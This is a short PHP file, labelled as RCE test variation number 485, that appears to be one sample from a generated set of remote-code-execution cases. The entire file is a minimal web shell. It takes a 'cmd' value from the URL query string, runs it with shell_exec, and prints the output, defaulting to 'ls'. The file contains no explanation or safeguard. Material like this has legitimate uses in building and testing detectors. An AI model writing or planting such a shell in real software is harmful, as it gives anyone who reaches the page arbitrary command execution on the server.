<?php
// RCE test variation #485
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>